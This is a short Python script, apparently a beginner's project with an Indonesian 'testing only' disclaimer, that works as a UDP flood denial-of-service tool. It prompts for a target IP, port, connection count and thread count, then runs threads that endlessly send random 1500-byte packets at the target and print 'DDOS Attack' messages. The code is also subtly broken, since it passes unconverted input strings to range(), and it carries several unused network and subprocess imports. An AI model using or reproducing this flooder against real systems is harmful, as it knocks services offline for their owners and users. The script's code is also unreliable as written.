from asyncio import threads
import random
import socket
import threading
import time
import os
import json
import platform as plt
from re import findall
from base64 import b64decode
from datetime import datetime
from json import loads, dumps
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen

os.system("cls")
#login tools
print("""
\u001b[31m
██████╗░░█████╗░██╗░░░██╗    ██╗░░░░░███████╗░█████╗░██████╗░███╗░░██╗
██╔══██╗██╔══██╗╚██╗░██╔╝    ██║░░░░░██╔════╝██╔══██╗██╔══██╗████╗░██║
██║░░██║███████║░╚████╔╝░    ██║░░░░░█████╗░░███████║██████╔╝██╔██╗██║
██║░░██║██╔══██║░░╚██╔╝░░    ██║░░░░░██╔══╝░░██╔══██║██╔══██╗██║╚████║
██████╔╝██║░░██║░░░██║░░░    ███████╗███████╗██║░░██║██║░░██║██║░╚███║
╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░    ╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝

                     DAY 1 LEARN PY
>> Tool by : GUHHS3C
>> Coded   : Gh
>> Note    : Disclaimer INI HANYA UNTUK TESTING, JANGAN DISALAH GUNAKAN!!
	  JIKA KAMU MENGGUNAKAN UNTUK KEJAHATAN,BUKAN TANGGUNG JAWAB SAYA
	  
""")
print("\033[37m╔══════════════════════════════════════╗")
print("║         CONFIGURATION PANEL          ║")
print("╚══════════════════════════════════════╝\n")

#INPUT
ip = input("\033[31m[01]\033[37m Target IP     : ")
port = input("\033[31m[02]\033[37m Target Port   : ")
times = input("\033[31m[03]\033[37m Connections   : ")
threads = input("\033[31m[04]\033[37m Thread Count  : ")
# Attack
def wt():
	data = random._urandom(1500)
	i = random.choice(("[x]","[$]","[✓]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i,f"\u001b[33m [$] $DDOS ☞︎︎︎\u001b[31mAttack To Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")
		except:
			print(i,f"\u001b[33m [$] $DDOS ☞︎︎︎\u001b[31mAttack to Ip \u001b[37m{ip} \u001b[31mOn Port \u001b[37m{port}")

# Threads
for y in range(threads):
	th = threading.Thread(target = wt)
	th.start()
